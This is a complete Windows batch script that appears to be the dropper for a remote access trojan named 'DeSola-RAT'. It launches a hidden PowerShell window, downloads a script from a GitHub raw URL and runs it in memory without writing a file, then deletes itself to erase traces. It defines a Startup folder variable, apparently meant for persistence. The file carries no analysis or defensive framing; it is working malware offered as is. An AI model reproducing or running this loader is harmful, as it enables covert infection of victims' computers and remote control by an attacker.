@echo off
set "startup=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

:: Download and execute wget.cmd via memory (no file)
powershell -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/r00tm4st3r/DeSola-RAT/refs/heads/main/files/wget.cmd')"

:: Self-delete
del "%~f0" >nul 2>&1
exit /b